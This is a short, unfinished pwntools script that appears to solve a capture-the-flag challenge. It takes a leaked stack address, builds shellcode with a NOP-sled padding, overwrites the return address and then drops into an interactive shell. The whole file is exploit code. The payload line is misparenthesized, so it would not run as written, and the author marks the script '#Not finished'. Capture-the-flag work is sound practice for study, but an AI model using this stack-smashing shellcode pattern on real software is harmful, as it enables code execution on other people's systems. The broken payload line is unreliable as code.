from pwn import *
binary = context.binary = ELF('./chall_03')
p=process(binary.path)
p.sendlineafter('She sellz sea shellz by the return address\n','foobar')
p.recvuntil('Here\'s a leak :)')
_ = p.recvline().strip()
stack = int(_,16)

p.sendline(b'' + asm(shellcraft.sh())+ (0x148 - len(b'' + asm(shellcraft.sh())) * b'\x90' + p64(stack)))
p.interactive()

#Not finished
